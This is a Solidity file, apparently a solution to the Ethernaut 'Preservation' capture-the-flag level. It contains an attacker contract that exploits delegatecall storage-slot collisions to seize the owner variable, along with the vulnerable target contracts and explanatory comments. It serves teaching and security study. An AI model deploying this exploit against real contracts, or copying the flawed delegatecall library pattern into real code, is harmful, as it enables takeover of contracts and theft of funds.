// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EvilLibrary {
    // Note that these variables are exactly the same as in Preservation
    // This is because delegateCall() is changing variables based on which slot they're in, not their name.
    // In fact, these variables could be completely renamed and it would still work.
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;            // SLOT 2
    uint storedTime;                 // SLOT 3
    
    function setTime(uint _time) public {
        owner = msg.sender; // msg.sender will be your metamask address
    }
}


// The below is not needed in Remix for this level, but I added some comments to try to better explain what's happening

contract Preservation {

  // public library contracts 
  address public timeZone1Library; // SLOT 0
  address public timeZone2Library; // SLOT 1
  address public owner;            // SLOT 2
  uint storedTime;                 // SLOT 3
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    // when this function is called the first time, it calls the original library, LibraryContract
    // That first call will change timeZone1Library to the evil library's address
    // When this function is called the second time, it is pointing to the evil library, so it will call the evil library's
    // version of setTime() which changes the owner variable at slot 2 (slots are zero indexed)

    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// bad library implementation.
// The state variables do not match Preservation exactly, so unintended things will happen.
contract LibraryContract {
  
  uint storedTime; // This variable at slot 0 matches up with timeZone1Library in Preservation, not storedTime in Preservation

  function setTime(uint _time) public {
    storedTime = _time; // this is changing timeZone1Library in Preservation!! Woops
  }
}